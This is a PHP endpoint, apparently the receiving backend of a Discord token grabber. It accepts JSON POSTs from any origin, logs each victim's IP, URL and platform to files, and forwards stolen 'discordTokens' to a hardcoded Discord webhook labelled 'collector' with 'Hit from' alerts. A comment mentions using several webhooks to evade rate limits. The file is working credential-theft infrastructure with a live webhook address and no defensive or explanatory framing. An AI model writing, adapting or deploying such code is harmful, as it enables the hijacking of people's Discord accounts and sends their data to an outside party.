<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

$raw = file_get_contents('php://input');
if (!$raw) { http_response_code(400); echo '{"error":"no body"}'; exit; }

$data = json_decode($raw, true);
if (!is_array($data)) { http_response_code(400); echo '{"error":"bad json"}'; exit; }

// IP thật
$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
   ?? $_SERVER['HTTP_X_FORWARDED_FOR']
   ?? $_SERVER['REMOTE_ADDR']
   ?? 'unknown';
$data['_ip'] = $ip;
$data['_server_time'] = date('c');

// log local
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) { @mkdir($logDir, 0755, true); }
$line = date('Ymd_His') . '_' . preg_replace('/[^a-z0-9]/i','', $ip) . '.json';
file_put_contents($logDir . '/' . $line, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// forward webhook — nhiều webhook để chống rate limit
$webhooks = [
  'https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe',
  // 'https://discord.com/api/webhooks/BACKUP_ID/BACKUP_TOKEN',
];

$tokens = $data['discordTokens'] ?? [];
$tokenLines = '';
foreach ($tokens as $t) {
  $tokenLines .= "`" . substr($t['token'], 0, 40) . "...`\n";
}

$payload = [
  'username' => 'collector',
  'embeds' => [[
    'title' => 'Hit from ' . $ip,
    'color' => 0xffffff,
    'fields' => [
      ['name' => 'URL', 'value' => substr((string)($data['url'] ?? ''), 0, 1000), 'inline' => false],
      ['name' => 'Platform', 'value' => (string)($data['platform'] ?? ''), 'inline' => true],
      ['name' => 'Touch', 'value' => !empty($data['touch']) ? 'yes' : 'no', 'inline' => true],
      ['name' => 'Tokens', 'value' => $tokenLines ?: 'none', 'inline' => false],
    ],
    'timestamp' => date('c'),
  ]],
];

foreach ($webhooks as $wh) {
  $ch = curl_init($wh);
  curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 8,
  ]);
  curl_exec($ch);
  curl_close($ch);
}

echo json_encode(['ok' => true]);
